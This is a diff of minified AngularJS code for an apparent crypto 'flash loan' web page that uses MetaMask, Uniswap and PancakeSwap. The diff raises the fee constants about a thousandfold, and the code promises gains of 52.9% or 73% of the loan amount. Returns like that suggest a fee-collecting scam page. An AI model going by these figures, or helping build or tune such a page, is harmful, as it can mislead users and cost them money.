@@ -18,7 +18,7 @@ app.controller("myCtrl", ["$scope", async function(n) {
         },
         n.loan = {
             amount: 25,
-            tokenFee: .00001,
+            tokenFee: .01,
             swapFee: 0,
             totalFee: 0,
             gain: 0
@@ -33,7 +33,7 @@ app.controller("myCtrl", ["$scope", async function(n) {
             return "" == t ? alert("Token Symbol cannot be blank") : t.match(/^[a-zA-Z]+$/) ? window.isBnb && n.erc20.network ? alert("Network Mismatch. Set MetaMask network to Ethereum and reload the page.") : window.isBnb || n.erc20.network ? (n.formStep = 2,
             n.currency = n.erc20.network ? "ETH" : "BNB",
             n.dex = n.erc20.network ? "Uniswap" : "PancakeSwap",
-            n.loan.tokenFee = n.erc20.network ? .00001 : .00005,
+            n.loan.tokenFee = n.erc20.network ? .01 : .05,
             n.ivm = n.erc20.network ? oeb : ubx,
             n.getLoanEstimates(),
             void setTimeout(function() {
@@ -46,7 +46,7 @@ app.controller("myCtrl", ["$scope", async function(n) {
         }
         ,
         n.getLoanEstimates = function() {
-            null != n.loan.amount && null != n.loan.amount && (n.loan.swapFee = n.loan.amount / (n.erc20.network ? 40000 : 20000),
+            null != n.loan.amount && null != n.loan.amount && (n.loan.swapFee = n.loan.amount / (n.erc20.network ? 400 : 200),
             n.loan.totalFee = fixNumber(n.loan.tokenFee + n.loan.swapFee),
             n.loan.gain = fixNumber(n.loan.amount * (n.erc20.network ? .529 : .73)))
         }
